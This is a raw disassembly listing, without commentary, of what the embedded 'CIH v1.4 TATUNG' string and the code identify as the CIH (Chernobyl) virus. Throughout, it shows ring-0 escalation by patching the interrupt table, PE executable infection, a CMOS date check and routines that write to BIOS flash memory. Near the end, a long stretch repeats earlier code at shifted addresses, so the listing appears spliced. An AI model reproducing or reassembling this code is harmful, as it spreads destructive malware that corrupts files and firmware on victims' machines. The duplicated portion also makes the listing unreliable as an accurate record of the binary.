                           .text:00401000 c3                               ret    
                           .text:00401001 00 00                            add    %al,(%eax)
                           .text:00401003 00 00                            add    %al,(%eax)
                           .text:00401005 00 00                            add    %al,(%eax)
                           .text:00401007 00 00                            add    %al,(%eax)
                           .text:00401009 00 00                            add    %al,(%eax)
                           .text:0040100b 00 0b                            add    %cl,(%ebx)
                           .text:0040100d 04 00                            add    $0x0,%al
                           .text:0040100f 00 55 8d                         add    %dl,-0x73(%ebp)
                           .text:00401012 44                               inc    %esp
                           .text:00401013 24 f8                            and    $0xf8,%al
                           .text:00401015 33 db                            xor    %ebx,%ebx
                           .text:00401017 64 87 03                         xchg   %eax,%fs:(%ebx)
                           .text:0040101a e8 00 00 00 00                   call   0x0040101f
                           .text:0040101f 5b                               pop    %ebx
                           .text:00401020 8d 4b 44                         lea    0x44(%ebx),%ecx
                           .text:00401023 51                               push   %ecx
                           .text:00401024 50                               push   %eax
                           .text:00401025 50                               push   %eax
                           .text:00401026 0f 01 4c 24 fe                   sidtl  -0x2(%esp)
                           .text:0040102b 5b                               pop    %ebx
                           .text:0040102c 83 c3 2c                         add    $0x2c,%ebx
                           .text:0040102f fa                               cli    
                           .text:00401030 8b 2b                            mov    (%ebx),%ebp
                           .text:00401032 66 8b 6b fc                      mov    -0x4(%ebx),%bp
                           .text:00401036 8d 71 12                         lea    0x12(%ecx),%esi
                           .text:00401039 56                               push   %esi
                           .text:0040103a 66 89 73 fc                      mov    %si,-0x4(%ebx)
                           .text:0040103e c1 ee 10                         shr    $0x10,%esi
                           .text:00401041 66 89 73 02                      mov    %si,0x2(%ebx)
                           .text:00401045 5e                               pop    %esi
                           .text:00401046 cd 05                            int    $0x5
                           .text:00401048 56                               push   %esi
                           .text:00401049 8b f0                            mov    %eax,%esi
                           .text:0040104b 8b 48 fc                         mov    -0x4(%eax),%ecx
                           .text:0040104e f3 a4                            rep movsb %ds:(%esi),%es:(%edi)
                           .text:00401050 83 e8 08                         sub    $0x8,%eax
                           .text:00401053 8b 30                            mov    (%eax),%esi
                           .text:00401055 0b f6                            or     %esi,%esi
                           .text:00401057 74 02                            je     0x0040105b
                           .text:00401059 eb f0                            jmp    0x0040104b
                           .text:0040105b 5e                               pop    %esi
                           .text:0040105c cd 05                            int    $0x5
                           .text:0040105e fb                               sti    
                           .text:0040105f 33 db                            xor    %ebx,%ebx
                           .text:00401061 eb 07                            jmp    0x0040106a
                           .text:00401063 33 db                            xor    %ebx,%ebx
                           .text:00401065 64 8b 03                         mov    %fs:(%ebx),%eax
                           .text:00401068 8b 20                            mov    (%eax),%esp
                           .text:0040106a 64 8f 03                         popl   %fs:(%ebx)
                           .text:0040106d 58                               pop    %eax
                           .text:0040106e 5d                               pop    %ebp
                           .text:0040106f 68 00 10 40 00                   push   $0x401000
                           .text:00401074 c3                               ret    
                           .text:00401075 74 32                            je     0x004010a9
                           .text:00401077 0f 21 c1                         mov    %db0,%ecx
                           .text:0040107a e3 10                            jecxz  0x0040108c
                           .text:0040107c 83 04 24 16                      addl   $0x16,(%esp)
                           .text:00401080 66 89 6b fc                      mov    %bp,-0x4(%ebx)
                           .text:00401084 c1 ed 10                         shr    $0x10,%ebp
                           .text:00401087 66 89 6b 02                      mov    %bp,0x2(%ebx)
                           .text:0040108b cf                               iret   
                           .text:0040108c 0f 23 c3                         mov    %ebx,%db0
                           .text:0040108f 6a 0f                            push   $0xf
                           .text:00401091 51                               push   %ecx
                           .text:00401092 6a ff                            push   $0xffffffff
                           .text:00401094 51                               push   %ecx
                           .text:00401095 51                               push   %ecx
                           .text:00401096 51                               push   %ecx
                           .text:00401097 6a 01                            push   $0x1
                           .text:00401099 6a 02                            push   $0x2
                           .text:0040109b cd 20                            int    $0x20
                           .text:0040109d 53                               push   %ebx
                           .text:0040109e 00 01                            add    %al,(%ecx)
                           .text:004010a0 00 83 c4 20 97 8d                add    %al,-0x7268df3c(%ebx)
                           .text:004010a6 46                               inc    %esi
                           .text:004010a7 9b                               fwait
                           .text:004010a8 cf                               iret   
                           .text:004010a9 8d 87 d9 fc ff ff                lea    -0x327(%edi),%eax
                           .text:004010af 50                               push   %eax
                           .text:004010b0 cd 20                            int    $0x20
                           .text:004010b2 67 00 40 00                      add    %al,0x0(%bx,%si)
                           .text:004010b6 0f 23 c0                         mov    %eax,%db0
                           .text:004010b9 58                               pop    %eax
                           .text:004010ba 8b 4e 3d                         mov    0x3d(%esi),%ecx
                           .text:004010bd 8b 11                            mov    (%ecx),%edx
                           .text:004010bf 89 50 fc                         mov    %edx,-0x4(%eax)
                           .text:004010c2 8d 40 d6                         lea    -0x2a(%eax),%eax
                           .text:004010c5 89 01                            mov    %eax,(%ecx)
                           .text:004010c7 fa                               cli    
                           .text:004010c8 eb b6                            jmp    0x00401080
                           .text:004010ca 53                               push   %ebx
                           .text:004010cb e8 00 00 00 00                   call   0x004010d0
                           .text:004010d0 5b                               pop    %ebx
                           .text:004010d1 83 c3 24                         add    $0x24,%ebx
                           .text:004010d4 53                               push   %ebx
                           .text:004010d5 cd 20                            int    $0x20
                           .text:004010d7 68 00 40 00 58                   push   $0x58004000
                           .text:004010dc ff 74 24 08                      pushl  0x8(%esp)
                           .text:004010e0 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e3 59                               pop    %ecx
                           .text:004010e4 50                               push   %eax
                           .text:004010e5 53                               push   %ebx
                           .text:004010e6 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e9 59                               pop    %ecx
                           .text:004010ea 0f 23 c0                         mov    %eax,%db0
                           .text:004010ed 58                               pop    %eax
                           .text:004010ee 5b                               pop    %ebx
                           .text:004010ef c3                               ret    
                           .text:004010f0 00 00                            add    %al,(%eax)
                           .text:004010f2 00 00                            add    %al,(%eax)
                           .text:004010f4 60                               pusha  
                           .text:004010f5 e8 00 00 00 00                   call   0x004010fa
                           .text:004010fa 5e                               pop    %esi
                           .text:004010fb 81 c6 21 03 00 00                add    $0x321,%esi
                           .text:00401101 f6 06 01                         testb  $0x1,(%esi)
                           .text:00401104 0f 85 16 02 00 00                jne    0x00401320
                           .text:0040110a 8d 5c 24 28                      lea    0x28(%esp),%ebx
                           .text:0040110e 83 3b 24                         cmpl   $0x24,(%ebx)
                           .text:00401111 0f 85 03 02 00 00                jne    0x0040131a
                           .text:00401117 fe 06                            incb   (%esi)
                           .text:00401119 83 c6 05                         add    $0x5,%esi
                           .text:0040111c 56                               push   %esi
                           .text:0040111d 8a 43 04                         mov    0x4(%ebx),%al
                           .text:00401120 3c ff                            cmp    $0xff,%al
                           .text:00401122 74 08                            je     0x0040112c
                           .text:00401124 04 40                            add    $0x40,%al
                           .text:00401126 b4 3a                            mov    $0x3a,%ah
                           .text:00401128 89 06                            mov    %eax,(%esi)
                           .text:0040112a 46                               inc    %esi
                           .text:0040112b 46                               inc    %esi
                           .text:0040112c 6a 00                            push   $0x0
                           .text:0040112e 6a 7f                            push   $0x7f
                           .text:00401130 8b 5b 10                         mov    0x10(%ebx),%ebx
                           .text:00401133 8b 43 0c                         mov    0xc(%ebx),%eax
                           .text:00401136 83 c0 04                         add    $0x4,%eax
                           .text:00401139 50                               push   %eax
                           .text:0040113a 56                               push   %esi
                           .text:0040113b cd 20                            int    $0x20
                           .text:0040113d 41                               inc    %ecx
                           .text:0040113e 00 40 00                         add    %al,0x0(%eax)
                           .text:00401141 83 c4 10                         add    $0x10,%esp
                           .text:00401144 81 7c 06 fc 2e 45 58 45          cmpl   $0x4558452e,-0x4(%esi,%eax,1)
                           .text:0040114c 5e                               pop    %esi
                           .text:0040114d 0f 85 c4 01 00 00                jne    0x00401317
                           .text:00401153 81 7c 06 fa 46 55 43 4b          cmpl   $0x4b435546,-0x6(%esi,%eax,1)
                           .text:0040115b 0f 85 b6 01 00 00                jne    0x00401317
                           .text:00401161 66 83 7b 18 01                   cmpw   $0x1,0x18(%ebx)
                           .text:00401166 0f 85 ab 01 00 00                jne    0x00401317
                           .text:0040116c 66 b8 00 43                      mov    $0x4300,%ax
                           .text:00401170 cd 20                            int    $0x20
                           .text:00401172 32 00                            xor    (%eax),%al
                           .text:00401174 40                               inc    %eax
                           .text:00401175 00 0f                            add    %cl,(%edi)
                           .text:00401177 82                               (bad)  
                           .text:00401178 9b                               fwait
                           .text:00401179 01 00                            add    %eax,(%eax)
                           .text:0040117b 00 51 8b                         add    %dl,-0x75(%ecx)
                           .text:0040117e be 52 fd ff ff                   mov    $0xfffffd52,%esi
                           .text:00401183 8b 3f                            mov    (%edi),%edi
                           .text:00401185 f6 c1 01                         test   $0x1,%cl
                           .text:00401188 74 08                            je     0x00401192
                           .text:0040118a 66 b8 01 43                      mov    $0x4301,%ax
                           .text:0040118e 33 c9                            xor    %ecx,%ecx
                           .text:00401190 ff d7                            call   *%edi
                           .text:00401192 33 c0                            xor    %eax,%eax
                           .text:00401194 b4 d5                            mov    $0xd5,%ah
                           .text:00401196 33 c9                            xor    %ecx,%ecx
                           .text:00401198 33 d2                            xor    %edx,%edx
                           .text:0040119a 42                               inc    %edx
                           .text:0040119b 8b da                            mov    %edx,%ebx
                           .text:0040119d 43                               inc    %ebx
                           .text:0040119e ff d7                            call   *%edi
                           .text:004011a0 93                               xchg   %eax,%ebx
                           .text:004011a1 59                               pop    %ecx
                           .text:004011a2 9c                               pushf  
                           .text:004011a3 f6 c1 01                         test   $0x1,%cl
                           .text:004011a6 74 06                            je     0x004011ae
                           .text:004011a8 66 b8 01 43                      mov    $0x4301,%ax
                           .text:004011ac ff d7                            call   *%edi
                           .text:004011ae 9d                               popf   
                           .text:004011af 0f 82 62 01 00 00                jb     0x00401317
                           .text:004011b5 56                               push   %esi
                           .text:004011b6 9c                               pushf  
                           .text:004011b7 83 c6 7f                         add    $0x7f,%esi
                           .text:004011ba 33 c0                            xor    %eax,%eax
                           .text:004011bc b4 d6                            mov    $0xd6,%ah
                           .text:004011be 8b e8                            mov    %eax,%ebp
                           .text:004011c0 6a 04                            push   $0x4
                           .text:004011c2 59                               pop    %ecx
                           .text:004011c3 6a 3c                            push   $0x3c
                           .text:004011c5 5a                               pop    %edx
                           .text:004011c6 ff d7                            call   *%edi
                           .text:004011c8 8b 16                            mov    (%esi),%edx
                           .text:004011ca 4a                               dec    %edx
                           .text:004011cb 8b c5                            mov    %ebp,%eax
                           .text:004011cd ff d7                            call   *%edi
                           .text:004011cf 81 3e 00 50 45 00                cmpl   $0x455000,(%esi)
                           .text:004011d5 0f 85 24 01 00 00                jne    0x004012ff
                           .text:004011db 53                               push   %ebx
                           .text:004011dc 6a 00                            push   $0x0
                           .text:004011de 6a 01                            push   $0x1
                           .text:004011e0 52                               push   %edx
                           .text:004011e1 57                               push   %edi
                           .text:004011e2 0f 23 cc                         mov    %esp,%db1
                           .text:004011e5 50                               push   %eax
                           .text:004011e6 8b c5                            mov    %ebp,%eax
                           .text:004011e8 b1 52                            mov    $0x52,%cl
                           .text:004011ea 83 c2 07                         add    $0x7,%edx
                           .text:004011ed ff d7                            call   *%edi
                           .text:004011ef 8d 42 22                         lea    0x22(%edx),%eax
                           .text:004011f2 50                               push   %eax
                           .text:004011f3 8d 06                            lea    (%esi),%eax
                           .text:004011f5 50                               push   %eax
                           .text:004011f6 0f b7 46 0e                      movzwl 0xe(%esi),%eax
                           .text:004011fa 8d 54 10 12                      lea    0x12(%eax,%edx,1),%edx
                           .text:004011fe b0 28                            mov    $0x28,%al
                           .text:00401200 8a 0e                            mov    (%esi),%cl
                           .text:00401202 f6 e1                            mul    %cl
                           .text:00401204 8d 76 32                         lea    0x32(%esi),%esi
                           .text:00401207 50                               push   %eax
                           .text:00401208 52                               push   %edx
                           .text:00401209 56                               push   %esi
                           .text:0040120a 41                               inc    %ecx
                           .text:0040120b 51                               push   %ecx
                           .text:0040120c c1 e1 03                         shl    $0x3,%ecx
                           .text:0040120f 51                               push   %ecx
                           .text:00401210 03 c8                            add    %eax,%ecx
                           .text:00401212 03 ca                            add    %edx,%ecx
                           .text:00401214 2b 4e 1c                         sub    0x1c(%esi),%ecx
                           .text:00401217 f7 d1                            not    %ecx
                           .text:00401219 41                               inc    %ecx
                           .text:0040121a 51                               push   %ecx
                           .text:0040121b 91                               xchg   %eax,%ecx
                           .text:0040121c 8b 46 f0                         mov    -0x10(%esi),%eax
                           .text:0040121f 03 46 fc                         add    -0x4(%esi),%eax
                           .text:00401222 89 86 9f fb ff ff                mov    %eax,-0x461(%esi)
                           .text:00401228 66 81 3c 24 ba 00                cmpw   $0xba,(%esp)
                           .text:0040122e 7c 7b                            jl     0x004012ab
                           .text:00401230 8b c5                            mov    %ebp,%eax
                           .text:00401232 ff d7                            call   *%edi
                           .text:00401234 95                               xchg   %eax,%ebp
                           .text:00401235 6a 04                            push   $0x4
                           .text:00401237 59                               pop    %ecx
                           .text:00401238 52                               push   %edx
                           .text:00401239 8b 56 3c                         mov    0x3c(%esi),%edx
                           .text:0040123c 83 c2 12                         add    $0x12,%edx
                           .text:0040123f ff d7                            call   *%edi
                           .text:00401241 81 3e 6e 5a 69 70                cmpl   $0x70695a6e,(%esi)
                           .text:00401247 74 67                            je     0x004012b0
                           .text:00401249 5a                               pop    %edx
                           .text:0040124a 5b                               pop    %ebx
                           .text:0040124b 5f                               pop    %edi
                           .text:0040124c 59                               pop    %ecx
                           .text:0040124d 57                               push   %edi
                           .text:0040124e 03 d5                            add    %ebp,%edx
                           .text:00401250 52                               push   %edx
                           .text:00401251 03 ee                            add    %esi,%ebp
                           .text:00401253 55                               push   %ebp
                           .text:00401254 8d 44 3d fc                      lea    -0x4(%ebp,%edi,1),%eax
                           .text:00401258 89 18                            mov    %ebx,(%eax)
                           .text:0040125a 53                               push   %ebx
                           .text:0040125b 03 d7                            add    %edi,%edx
                           .text:0040125d 52                               push   %edx
                           .text:0040125e 8d be 3f fb ff ff                lea    -0x4c1(%esi),%edi
                           .text:00401264 57                               push   %edi
                           .text:00401265 89 56 ce                         mov    %edx,-0x32(%esi)
                           .text:00401268 8d 56 d8                         lea    -0x28(%esi),%edx
                           .text:0040126b bd 0b 04 00 00                   mov    $0x40b,%ebp
                           .text:00401270 eb 31                            jmp    0x004012a3
                           .text:00401272 83 c2 28                         add    $0x28,%edx
                           .text:00401275 8b 5a 10                         mov    0x10(%edx),%ebx
                           .text:00401278 2b 5a 08                         sub    0x8(%edx),%ebx
                           .text:0040127b 76 2c                            jbe    0x004012a9
                           .text:0040127d 53                               push   %ebx
                           .text:0040127e 83 e8 08                         sub    $0x8,%eax
                           .text:00401281 89 18                            mov    %ebx,(%eax)
                           .text:00401283 8b 5a 14                         mov    0x14(%edx),%ebx
                           .text:00401286 03 5a 08                         add    0x8(%edx),%ebx
                           .text:00401289 53                               push   %ebx
                           .text:0040128a 57                               push   %edi
                           .text:0040128b 8b 5a 08                         mov    0x8(%edx),%ebx
                           .text:0040128e 03 5a 0c                         add    0xc(%edx),%ebx
                           .text:00401291 03 5e fc                         add    -0x4(%esi),%ebx
                           .text:00401294 89 58 04                         mov    %ebx,0x4(%eax)
                           .text:00401297 8b 18                            mov    (%eax),%ebx
                           .text:00401299 01 5a 08                         add    %ebx,0x8(%edx)
                           .text:0040129c 81 4a 24 40 00 00 40             orl    $0x40000040,0x24(%edx)
                           .text:004012a3 2b eb                            sub    %ebx,%ebp
                           .text:004012a5 76 0e                            jbe    0x004012b5
                           .text:004012a7 03 fb                            add    %ebx,%edi
                           .text:004012a9 e2 c7                            loop   0x00401272
                           .text:004012ab 0f 21 cc                         mov    %db1,%esp
                           .text:004012ae eb 33                            jmp    0x004012e3
                           .text:004012b0 83 c4 3c                         add    $0x3c,%esp
                           .text:004012b3 eb 4a                            jmp    0x004012ff
                           .text:004012b5 01 28                            add    %ebp,(%eax)
                           .text:004012b7 01 6c 24 08                      add    %ebp,0x8(%esp)
                           .text:004012bb 33 db                            xor    %ebx,%ebx
                           .text:004012bd 89 58 fc                         mov    %ebx,-0x4(%eax)
                           .text:004012c0 8d 86 9f fc ff ff                lea    -0x361(%esi),%eax
                           .text:004012c6 b1 04                            mov    $0x4,%cl
                           .text:004012c8 66 c7 00 cd 20                   movw   $0x20cd,(%eax)
                           .text:004012cd 8b 94 8e 27 ff ff ff             mov    -0xd9(%esi,%ecx,4),%edx
                           .text:004012d4 89 50 02                         mov    %edx,0x2(%eax)
                           .text:004012d7 0f b6 94 31 26 ff ff ff          movzbl -0xda(%ecx,%esi,1),%edx
                           .text:004012df 2b c2                            sub    %edx,%eax
                           .text:004012e1 e2 e5                            loop   0x004012c8
                           .text:004012e3 0f 21 c8                         mov    %db1,%eax
                           .text:004012e6 8b 58 10                         mov    0x10(%eax),%ebx
                           .text:004012e9 8b 38                            mov    (%eax),%edi
                           .text:004012eb 59                               pop    %ecx
                           .text:004012ec e3 0d                            jecxz  0x004012fb
                           .text:004012ee 8b f1                            mov    %ecx,%esi
                           .text:004012f0 b8 01 d6 00 00                   mov    $0xd601,%eax
                           .text:004012f5 5a                               pop    %edx
                           .text:004012f6 59                               pop    %ecx
                           .text:004012f7 ff d7                            call   *%edi
                           .text:004012f9 eb f0                            jmp    0x004012eb
                           .text:004012fb 5b                               pop    %ebx
                           .text:004012fc 58                               pop    %eax
                           .text:004012fd f9                               stc    
                           .text:004012fe 9c                               pushf  
                           .text:004012ff 33 c0                            xor    %eax,%eax
                           .text:00401301 b4 d7                            mov    $0xd7,%ah
                           .text:00401303 ff d7                            call   *%edi
                           .text:00401305 9d                               popf   
                           .text:00401306 5e                               pop    %esi
                           .text:00401307 73 31                            jae    0x0040133a
                           .text:00401309 8b df                            mov    %edi,%ebx
                           .text:0040130b 66 b8 03 43                      mov    $0x4303,%ax
                           .text:0040130f 8b 4e fc                         mov    -0x4(%esi),%ecx
                           .text:00401312 8b 7e fe                         mov    -0x2(%esi),%edi
                           .text:00401315 ff d3                            call   *%ebx
                           .text:00401317 fe 4e fb                         decb   -0x5(%esi)
                           .text:0040131a 61                               popa   
                           .text:0040131b 0f 21 c0                         mov    %db0,%eax
                           .text:0040131e ff 20                            jmp    *(%eax)
                           .text:00401320 8b dc                            mov    %esp,%ebx
                           .text:00401322 ff 73 38                         pushl  0x38(%ebx)
                           .text:00401325 ff 53 24                         call   *0x24(%ebx)
                           .text:00401328 59                               pop    %ecx
                           .text:00401329 89 43 1c                         mov    %eax,0x1c(%ebx)
                           .text:0040132c 83 7b 28 24                      cmpl   $0x24,0x28(%ebx)
                           .text:00401330 75 06                            jne    0x00401338
                           .text:00401332 8b 41 28                         mov    0x28(%ecx),%eax
                           .text:00401335 89 46 01                         mov    %eax,0x1(%esi)
                           .text:00401338 61                               popa   
                           .text:00401339 c3                               ret    
                           .text:0040133a b0 07                            mov    $0x7,%al
                           .text:0040133c e6 70                            out    %al,$0x70
                           .text:0040133e e4 71                            in     $0x71,%al
                           .text:00401340 34 26                            xor    $0x26,%al
                           .text:00401342 eb d3                            jmp    0x00401317
                           .text:00401344 66 bd f8 0c                      mov    $0xcf8,%bp
                           .text:00401348 8d 76 c5                         lea    -0x3b(%esi),%esi
                           .text:0040134b bf 4c 38 00 80                   mov    $0x8000384c,%edi
                           .text:00401350 66 ba fe 0c                      mov    $0xcfe,%dx
                           .text:00401354 fa                               cli    
                           .text:00401355 ff d6                            call   *%esi
                           .text:00401357 66 bf 58 00                      mov    $0x58,%di
                           .text:0040135b 4a                               dec    %edx
                           .text:0040135c 66 c7 46 08 24 0f                movw   $0xf24,0x8(%esi)
                           .text:00401362 ff d6                            call   *%esi
                           .text:00401364 8d 5e f4                         lea    -0xc(%esi),%ebx
                           .text:00401367 b8 55 55 0e 00                   mov    $0xe5555,%eax
                           .text:0040136c b9 aa 2a 0e 00                   mov    $0xe2aaa,%ecx
                           .text:00401371 ff d3                            call   *%ebx
                           .text:00401373 c6 00 60                         movb   $0x60,(%eax)
                           .text:00401376 51                               push   %ecx
                           .text:00401377 e2 fe                            loop   0x00401377
                           .text:00401379 32 e4                            xor    %ah,%ah
                           .text:0040137b 88 00                            mov    %al,(%eax)
                           .text:0040137d 91                               xchg   %eax,%ecx
                           .text:0040137e e2 fe                            loop   0x0040137e
                           .text:00401380 b8 55 55 0f 00                   mov    $0xf5555,%eax
                           .text:00401385 59                               pop    %ecx
                           .text:00401386 b5 aa                            mov    $0xaa,%ch
                           .text:00401388 ff d3                            call   *%ebx
                           .text:0040138a c6 00 20                         movb   $0x20,(%eax)
                           .text:0040138d e2 fe                            loop   0x0040138d
                           .text:0040138f b4 e0                            mov    $0xe0,%ah
                           .text:00401391 88 00                            mov    %al,(%eax)
                           .text:00401393 66 c7 46 08 0c 10                movw   $0x100c,0x8(%esi)
                           .text:00401399 ff d6                            call   *%esi
                           .text:0040139b 33 db                            xor    %ebx,%ebx
                           .text:0040139d b7 81                            mov    $0x81,%bh
                           .text:0040139f 53                               push   %ebx
                           .text:004013a0 83 ec 2c                         sub    $0x2c,%esp
                           .text:004013a3 68 00 10 00 c0                   push   $0xc0001000
                           .text:004013a8 b7 08                            mov    $0x8,%bh
                           .text:004013aa 53                               push   %ebx
                           .text:004013ab 51                               push   %ecx
                           .text:004013ac 51                               push   %ecx
                           .text:004013ad 51                               push   %ecx
                           .text:004013ae 68 01 05 00 40                   push   $0x40000501
                           .text:004013b3 41                               inc    %ecx
                           .text:004013b4 51                               push   %ecx
                           .text:004013b5 51                               push   %ecx
                           .text:004013b6 8b f4                            mov    %esp,%esi
                           .text:004013b8 81 ec ac 00 00 00                sub    $0xac,%esp
                           .text:004013be cd 20                            int    $0x20
                           .text:004013c0 04 00                            add    $0x0,%al
                           .text:004013c2 10 00                            adc    %al,(%eax)
                           .text:004013c4 66 83 7e 06 17                   cmpw   $0x17,0x6(%esi)
                           .text:004013c9 74 05                            je     0x004013d0
                           .text:004013cb fe 46 4d                         incb   0x4d(%esi)
                           .text:004013ce eb ee                            jmp    0x004013be
                           .text:004013d0 01 5e 10                         add    %ebx,0x10(%esi)
                           .text:004013d3 c6 46 4d 81                      movb   $0x81,0x4d(%esi)
                           .text:004013d7 eb e5                            jmp    0x004013be
                           .text:004013d9 88 08                            mov    %cl,(%eax)
                           .text:004013db 88 01                            mov    %al,(%ecx)
                           .text:004013dd c6 00 80                         movb   $0x80,(%eax)
                           .text:004013e0 88 08                            mov    %cl,(%eax)
                           .text:004013e2 88 01                            mov    %al,(%ecx)
                           .text:004013e4 c3                               ret    
                           .text:004013e5 97                               xchg   %eax,%edi
                           .text:004013e6 87 d5                            xchg   %edx,%ebp
                           .text:004013e8 ef                               out    %eax,(%dx)
                           .text:004013e9 97                               xchg   %eax,%edi
                           .text:004013ea 87 d5                            xchg   %edx,%ebp
                           .text:004013ec ec                               in     (%dx),%al
                           .text:004013ed 0c 44                            or     $0x44,%al
                           .text:004013ef 97                               xchg   %eax,%edi
                           .text:004013f0 87 d5                            xchg   %edx,%ebp
                           .text:004013f2 ef                               out    %eax,(%dx)
                           .text:004013f3 97                               xchg   %eax,%edi
                           .text:004013f4 87 d5                            xchg   %edx,%ebp
                           .text:004013f6 ee                               out    %al,(%dx)
                           .text:004013f7 c3                               ret    
                           .text:004013f8 00 3a                            add    %bh,(%edx)
                           .text:004013fa 66 35 53 00                      xor    $0x53,%ax
                           .text:004013fe 01 00                            add    %eax,(%eax)
                           .text:00401400 68 00 40 00 41                   push   $0x41004000
                           .text:00401405 00 40 00                         add    %al,0x0(%eax)
                           .text:00401408 32 00                            xor    (%eax),%al
                           .text:0040140a 40                               inc    %eax
                           .text:0040140b 00 43 49                         add    %al,0x49(%ebx)
                           .text:0040140e 48                               dec    %eax
                           .text:0040140f 20 76 31                         and    %dh,0x31(%esi)
                           .text:00401412 2e 34 20                         cs xor $0x20,%al
                           .text:00401415 54                               push   %esp
                           .text:00401416 41                               inc    %ecx
                           .text:00401417 54                               push   %esp
                           .text:00401418 55                               push   %ebp
                           .text:00401419 4e                               dec    %esi
                           .text:0040141a 47                               inc    %edi
                           .text:0040141b 00 8b 46 f0 03 46                add    %cl,0x4603f046(%ebx)
                           .text:00401421 fc                               cld    
                           .text:00401422 89 86 9f fb ff ff                mov    %eax,-0x461(%esi)
                           .text:00401428 66 81 3c 24 ba 00                cmpw   $0xba,(%esp)
                           .text:0040142e 7c 7b                            jl     0x004014ab
                           .text:00401430 8b c5                            mov    %ebp,%eax
                           .text:00401432 ff d7                            call   *%edi
                           .text:00401434 95                               xchg   %eax,%ebp
                           .text:00401435 6a 04                            push   $0x4
                           .text:00401437 59                               pop    %ecx
                           .text:00401438 52                               push   %edx
                           .text:00401439 8b 56 3c                         mov    0x3c(%esi),%edx
                           .text:0040143c 83 c2 12                         add    $0x12,%edx
                           .text:0040143f ff d7                            call   *%edi
                           .text:00401441 81 3e 6e 5a 69 70                cmpl   $0x70695a6e,(%esi)
                           .text:00401447 74 67                            je     0x004014b0
                           .text:00401449 5a                               pop    %edx
                           .text:0040144a 5b                               pop    %ebx
                           .text:0040144b 5f                               pop    %edi
                           .text:0040144c 59                               pop    %ecx
                           .text:0040144d 57                               push   %edi
                           .text:0040144e 03 d5                            add    %ebp,%edx
                           .text:00401450 52                               push   %edx
                           .text:00401451 03 ee                            add    %esi,%ebp
                           .text:00401453 55                               push   %ebp
                           .text:00401454 8d 44 3d fc                      lea    -0x4(%ebp,%edi,1),%eax
                           .text:00401458 89 18                            mov    %ebx,(%eax)
                           .text:0040145a 53                               push   %ebx
                           .text:0040145b 03 d7                            add    %edi,%edx
                           .text:0040145d 52                               push   %edx
                           .text:0040145e 8d be 3f fb ff ff                lea    -0x4c1(%esi),%edi
                           .text:00401464 57                               push   %edi
                           .text:00401465 89 56 ce                         mov    %edx,-0x32(%esi)
                           .text:00401468 8d 56 d8                         lea    -0x28(%esi),%edx
                           .text:0040146b bd 0b 04 00 00                   mov    $0x40b,%ebp
                           .text:00401470 eb 31                            jmp    0x004014a3
                           .text:00401472 83 c2 28                         add    $0x28,%edx
                           .text:00401475 8b 5a 10                         mov    0x10(%edx),%ebx
                           .text:00401478 2b 5a 08                         sub    0x8(%edx),%ebx
                           .text:0040147b 76 2c                            jbe    0x004014a9
                           .text:0040147d 53                               push   %ebx
                           .text:0040147e 83 e8 08                         sub    $0x8,%eax
                           .text:00401481 89 18                            mov    %ebx,(%eax)
                           .text:00401483 8b 5a 14                         mov    0x14(%edx),%ebx
                           .text:00401486 03 5a 08                         add    0x8(%edx),%ebx
                           .text:00401489 53                               push   %ebx
                           .text:0040148a 57                               push   %edi
                           .text:0040148b 8b 5a 08                         mov    0x8(%edx),%ebx
                           .text:0040148e 03 5a 0c                         add    0xc(%edx),%ebx
                           .text:00401491 03 5e fc                         add    -0x4(%esi),%ebx
                           .text:00401494 89 58 04                         mov    %ebx,0x4(%eax)
                           .text:00401497 8b 18                            mov    (%eax),%ebx
                           .text:00401499 01 5a 08                         add    %ebx,0x8(%edx)
                           .text:0040149c 81 4a 24 40 00 00 40             orl    $0x40000040,0x24(%edx)
                           .text:004014a3 2b eb                            sub    %ebx,%ebp
                           .text:004014a5 76 0e                            jbe    0x004014b5
                           .text:004014a7 03 fb                            add    %ebx,%edi
                           .text:004014a9 e2 c7                            loop   0x00401472
                           .text:004014ab 0f 21 cc                         mov    %db1,%esp
                           .text:004014ae eb 33                            jmp    0x004014e3
                           .text:004014b0 83 c4 3c                         add    $0x3c,%esp
                           .text:004014b3 eb 4a                            jmp    0x004014ff
                           .text:004014b5 01 28                            add    %ebp,(%eax)
                           .text:004014b7 01 6c 24 08                      add    %ebp,0x8(%esp)
                           .text:004014bb 33 db                            xor    %ebx,%ebx
                           .text:004014bd 89 58 fc                         mov    %ebx,-0x4(%eax)
                           .text:004014c0 8d 86 9f fc ff ff                lea    -0x361(%esi),%eax
                           .text:004014c6 b1 04                            mov    $0x4,%cl
                           .text:004014c8 66 c7 00 cd 20                   movw   $0x20cd,(%eax)
                           .text:004014cd 8b 94 8e 27 ff ff ff             mov    -0xd9(%esi,%ecx,4),%edx
                           .text:004014d4 89 50 02                         mov    %edx,0x2(%eax)
                           .text:004014d7 0f b6 94 31 26 ff ff ff          movzbl -0xda(%ecx,%esi,1),%edx
                           .text:004014df 2b c2                            sub    %edx,%eax
                           .text:004014e1 e2 e5                            loop   0x004014c8
                           .text:004014e3 0f 21 c8                         mov    %db1,%eax
                           .text:004014e6 8b 58 10                         mov    0x10(%eax),%ebx
                           .text:004014e9 8b 38                            mov    (%eax),%edi
                           .text:004014eb 59                               pop    %ecx
                           .text:004014ec e3 0d                            jecxz  0x004014fb
                           .text:004014ee 8b f1                            mov    %ecx,%esi
                           .text:004014f0 b8 01 d6 00 00                   mov    $0xd601,%eax
                           .text:004014f5 5a                               pop    %edx
                           .text:004014f6 59                               pop    %ecx
                           .text:004014f7 ff d7                            call   *%edi
                           .text:004014f9 eb f0                            jmp    0x004014eb
                           .text:004014fb 5b                               pop    %ebx
                           .text:004014fc 58                               pop    %eax
                           .text:004014fd f9                               stc    
                           .text:004014fe 9c                               pushf  
                           .text:004014ff 33 c0                            xor    %eax,%eax
                           .text:00401501 b4 d7                            mov    $0xd7,%ah
                           .text:00401503 ff d7                            call   *%edi
                           .text:00401505 9d                               popf   
                           .text:00401506 5e                               pop    %esi
                           .text:00401507 73 31                            jae    0x0040153a
                           .text:00401509 8b df                            mov    %edi,%ebx
                           .text:0040150b 66 b8 03 43                      mov    $0x4303,%ax
                           .text:0040150f 8b 4e fc                         mov    -0x4(%esi),%ecx
                           .text:00401512 8b 7e fe                         mov    -0x2(%esi),%edi
                           .text:00401515 ff d3                            call   *%ebx
                           .text:00401517 fe 4e fb                         decb   -0x5(%esi)
                           .text:0040151a 61                               popa   
                           .text:0040151b 0f 21 c0                         mov    %db0,%eax
                           .text:0040151e ff 20                            jmp    *(%eax)
